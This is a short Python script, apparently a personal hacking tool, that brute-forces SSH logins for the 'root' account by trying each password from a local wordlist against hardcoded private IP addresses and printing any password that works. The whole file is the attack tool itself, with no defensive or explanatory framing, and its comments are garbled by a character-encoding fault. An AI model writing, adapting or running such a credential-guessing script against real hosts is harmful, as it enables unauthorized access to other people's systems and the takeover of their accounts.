#!/usr/bin/python
# !usr/bin/env
# -*- coding: utf-8 -*-
import sys, time, argparse
import paramiko


class ssh_brute(object):
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connect(self, host, port, username, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(hostname=host, port=port, username=username, password=str(password), timeout=0.01)
            ssh.close()
        except:
            print("The password:{password} error!".format(password=password))
            ssh.close()
            return
        print("find it!\nusername:\033[1;32;40m{username} \npassword:{password}\033[0m".format(username=username, password=password))
        exit()

    def getpassword(self):
        dict = "C:/Users/root/Desktop/dic.txt"  #×ÖµäÂ·¾¶
        with open(dict) as f:
            password = f.readlines()
            return password

    def main(self):
        host = self.host
        port = self.port
        username = "root"
        password = self.getpassword()
        print("[+]host:{host}".format(host=host))
        print("[+]username:{username}".format(username=username))
        for paw in password:
            paw = paw.strip("\n")
            self.connect(host, port, username, paw)


def parse():
    parse = argparse.ArgumentParser("a ssh brute force crack")
    parse.add_argument("-host", dest="host", default="10.20.60.13", help="This is to set ip")
    parse.add_argument("-port", dest="port", default="22", help="This is to set port default:22")
    args = parse.parse_args()
    return args.host, args.port


def main():
    #host, port = parse() //ÃüÁîÐÐ½âÎö
    host = '172.20.101.101'
    port = '22'
    ssh_brute(host, port).main()


if __name__ == '__main__':
    main()